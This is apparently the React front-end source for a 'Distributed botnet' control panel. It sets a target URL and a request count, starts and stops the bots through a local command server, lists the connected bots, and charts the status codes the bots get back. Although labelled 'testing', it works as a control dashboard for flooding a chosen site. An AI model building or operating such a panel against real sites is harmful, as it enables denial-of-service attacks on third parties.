import React, { useState, useEffect, useReducer, useLayoutEffect } from "react";
import {
  BarChart,
  Bar,
  XAxis,
  YAxis,
  CartesianGrid,
  Tooltip,
  Legend,
  ResponsiveContainer,
} from "recharts";
import axios from "axios";
import {
  FormControl,
  FormLabel,
  Switch,
  Badge,
  Button,
  Input,
  Code,
  Checkbox,
} from "@vechaiui/react";

const Panel = () => {
  const serverUrl = "http://localhost:5000";

  const [time, setTime] = useState(0);
  const [requestsNum, setRequestsNum] = useState(100);
  const [requestsSent, setRequestsSent] = useState(0);
  const [active, setActive] = useState(false);
  const [running, setRunning] = useState(false);
  const [target, setTarget] = useState("");
  const [activeBots, setActiveBots] = useState([]);
  const [botsStats, setBotsStats] = useState([]);
  const [responses, setResponses] = useState<number[]>([]);
  const [graphData, setGraphData] = useState<Object[]>([]);
  const [renderCount, forceUpdate] = useReducer((x) => x + 1, 0);
  const [selectedFile, setSelectedFile] = useState();
  const [isFilePicked, setIsFilePicked] = useState(false);

  useLayoutEffect(() => {
    forceUpdate(); // Call forceUpdate when data changes
  }, [graphData, forceUpdate]);

  let intervalTimer: NodeJS.Timer;
  let intervalActivity: NodeJS.Timer;

  const changeHandler = (event: {
    target: { files: React.SetStateAction<undefined>[] };
  }) => {
    setSelectedFile(event.target.files[0]);
    setIsFilePicked(true);
  };

  const handleSubmission = () => {};

  const changeServerStatus = async (serverUrl: string, status: boolean) => {
    const changeServerStatusEndpoint: string = "/setServerStatus";

    const statusObject = {
      status: status,
    };

    try {
      setActive(status);
      await axios.post(serverUrl + changeServerStatusEndpoint, statusObject);
    } catch (err) {
      console.log({
        message: "Status setting failed.",
        errorInfo: err,
      });
    }
  };

  const setRequestsNumber = async (requestsNum: number) => {
    const setRequestsNumberEndpoint: string = "/setRequestsNumber";

    const requestsNumObject = {
      requestsNumber: requestsNum,
    };

    try {
      await axios.post(
        serverUrl + setRequestsNumberEndpoint,
        requestsNumObject
      );
    } catch (err) {
      console.log({
        message: "Requests number setting failed.",
        errorInfo: err,
      });
    }
  };

  const changeTarget = async (serverUrl: string, target: string) => {
    const changeTargetEndpoint: string = "/changeTarget";

    const targetObject = {
      target: target,
    };

    try {
      await axios.post(serverUrl + changeTargetEndpoint, targetObject);
    } catch (err) {
      console.log({
        message: "Target setting failed.",
        errorInfo: err,
      });
    }
  };

  const getActiveBots = async (serverUrl: string) => {
    const getActiveBotsEndpoint = "/getConnectedBots";
    try {
      const response = await axios.get(serverUrl + getActiveBotsEndpoint);
      const responseData = response.data;
      const { connectedBots } = responseData;

      setActiveBots(connectedBots);
      console.log(responseData);
    } catch (err) {
      console.log(err);
    }
  };

  const getBotsStats = async (serverUrl: string, responses: number[]) => {
    const getBotsStatsEndpoint = "/getBotsStats";
    try {
      const response = await axios.get(serverUrl + getBotsStatsEndpoint);
      const responseData = response.data;

      setBotsStats(responseData.stats);
      console.log(responseData.stats);
      botsStats.map((resp: any) =>
        setResponses([...responses, ...resp.Status])
      );
      console.log("responses");
      console.log(responses);
      setGraphData(parseStatsData(responses));
      console.log("graphData");
      console.log(graphData);
    } catch (err) {
      console.log(err);
    }
  };

  const parseStatsData = (responseList: number[]) => {
    const data: {
      statusCode: string;
      amount: number;
    }[] = [];
    const countCodes = responseList.reduce(
      (acc: any, curr: any) => ((acc[curr] = (acc[curr] || 0) + 1), acc),
      {}
    );
    for (const status of Object.keys(countCodes)) {
      data.push({
        statusCode: status,
        amount: countCodes[status],
      });
    }
    setGraphData(data);
    return data;
  };

  const startBotnet = (
    serverUrl: string,
    requestsNum: number,
    target: string
  ) => {
    setRunning(true);
    setTime(0);
    setRequestsNumber(requestsNum);
    setResponses([]);
    changeServerStatus(serverUrl, true);
    changeTarget(serverUrl, "https://" + target);
    getActiveBots(serverUrl);
  };

  const stopBotnet = (serverUrl: string) => {
    changeServerStatus(serverUrl, false);
    setRunning(false);
    setActiveBots([]);
    setBotsStats([]);
  };

  useEffect(() => {
    if (running) {
      intervalTimer = setInterval(() => {
        setTime((prevTime) => prevTime + 10);
      }, 10);
      intervalActivity = setInterval(() => {
        getActiveBots(serverUrl);
        getBotsStats(serverUrl, responses);
        // parseStatsData(responses);
      }, 10000);
    } else if (!running) {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    }

    return () => {
      clearInterval(intervalTimer);
      clearInterval(intervalActivity);
    };
  }, [running]);

  return (
    <div>
      <div className="mt-8 mx-20">
        <h1 className="text-3xl font-bold text-gray-700">Distributed botnet</h1>
        <p className="text-gray-400 mb-8">version 1.0.2</p>
        <div className=" w-full flex h-full">
          <div className="flex flex-col w-1/2">
            <div className="h-64">
              <p className="text-gray-500 text-base mb-3">Give the target:</p>
              <div className="w-5/6 mb-5">
                <Input.Group>
                  <Input.LeftAddon children="https://" />
                  <Input
                    placeholder="target"
                    onChange={(e) => {
                      setTarget(e.target.value);
                    }}
                  />
                </Input.Group>
              </div>
              <p className="text-gray-400 text-sm">Configuration:</p>
              <div className="flex gap-5 mt-2 mb-3 w-5/6 ">
                <FormControl id="email" className=" flex flex-col ">
                  <FormLabel>Amount of requests</FormLabel>
                  <Input
                    placeholder="100"
                    onChange={(e) => {
                      setRequestsNum(parseInt(e.target.value));
                    }}
                    required
                  />
                </FormControl>
                <FormControl className="flex flex-col">
                  <FormLabel htmlFor="server-active" className="mb-0 mr-2">
                    Set server active
                  </FormLabel>
                  <Switch
                    className="mt-3"
                    id="server-active"
                    checked={active}
                    onChange={() => changeServerStatus(serverUrl, !active)}
                  />
                </FormControl>
              </div>
              <div className="w-5/6 flex justify-end">
                <div>
                  <Input
                    type="file"
                    name="file"
                    onChange={() => changeHandler}
                  />
                  <div>
                    {/* <Button onClick={handleSubmission}>Submit</Button> */}
                  </div>
                </div>
                <Button
                  onClick={() => {
                    startBotnet(serverUrl, requestsNum, target);
                  }}
                  variant="solid"
                  color="primary"
                >
                  Start testing
                </Button>
              </div>
            </div>
            <div className="bg-gray-100 rounded h-72 overflow-scroll p-3">
              <p className="text-gray-500 text-base mb-3">Bots response log:</p>

              {botsStats.length != 0
                ? botsStats.map((response: any) => (
                    <Code className="flex flex-col justify-start items-start">
                      <p>TIME: {response.ResponseTime}</p>
                      <p>TARGET: {response.Target}</p>
                      <p>STATUS: {JSON.stringify(response.Status)}</p>
                    </Code>
                  ))
                : "No information retrieved yet"}
            </div>
          </div>
          <div className="flex-col w-1/2">
            <div className="h-52">
              <div className="flex items-center mb-3 gap-2">
                <p className="text-gray-500 text-base">Connected bots</p>
                <Badge>{activeBots.length}</Badge>
              </div>
              <div>
                {activeBots.length != 0 ? (
                  activeBots.map((bot: string) => (
                    <div className="bg-gray-100 h-8 flex items-center p-3 mb-1 rounded">
                      <p className="text-gray-700 blur-[5px] hover:blur-none font-medium text-base ">
                        {bot.slice(2)}
                      </p>
                    </div>
                  ))
                ) : (
                  <p className="text-gray-400  font-normal mt-5 text-center">
                    No bots connected
                  </p>
                )}
              </div>
            </div>
            <div className="bg-gray-100 rounded ml-2 h-80 p-3">
              <p>Requests stats</p>
              <ResponsiveContainer>
                <BarChart
                  // width={500}
                  // height={300}
                  key={renderCount}
                  data={graphData}
                  margin={{
                    top: 5,
                    right: 30,
                    left: 20,
                    bottom: 15,
                  }}
                  barSize={30}
                >
                  <XAxis
                    dataKey="statusCode"
                    scale="point"
                    padding={{ left: 10, right: 10 }}
                  />
                  <YAxis />
                  <Tooltip />
                  {/* <Legend /> */}
                  <CartesianGrid strokeDasharray="3 3" />
                  <Bar
                    dataKey="amount"
                    fill="#14B8A6"
                    background={{ fill: "#eee" }}
                  />
                </BarChart>
              </ResponsiveContainer>
            </div>
          </div>
        </div>
      </div>
      <div className="h-20 w-full fixed bottom-0 flex items-center justify-around bg-gray-100">
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Target:</p>
          <p className="text-gray-600 text-sm font-medium">
            {target ? target : "Not defined"}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Status:</p>
          {active ? (
            <p className="text-green-400 text-sm font-medium">Active</p>
          ) : (
            <p className="text-red-400 text-sm font-medium">Disabled</p>
          )}
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm ">Requests sent:</p>
          <p className="text-gray-700 text-sm font-medium">
            {responses.length + " / " + requestsNum}
          </p>
        </div>
        <div className=" flex flex-row gap-1">
          <p className="text-gray-400 text-sm flex items-center">
            Time elapsed:
          </p>
          <p className="text-4xl font-bold text-gray-600 bottom-0">
            <div className="numbers">
              <span>{("0" + Math.floor((time / 60000) % 60)).slice(-2)}:</span>
              <span>{("0" + Math.floor((time / 1000) % 60)).slice(-2)}</span>
            </div>
          </p>
        </div>

        <Button
          onClick={() => {
            stopBotnet(serverUrl);
            // changeServerStatus(serverUrl, false);
            // setRunning(false);
            // setActiveBots([]);
            // setBotsStats([]);
          }}
          variant="solid"
          className="w-20"
        >
          Stop
        </Button>
      </div>
    </div>
  );
};

export default Panel;
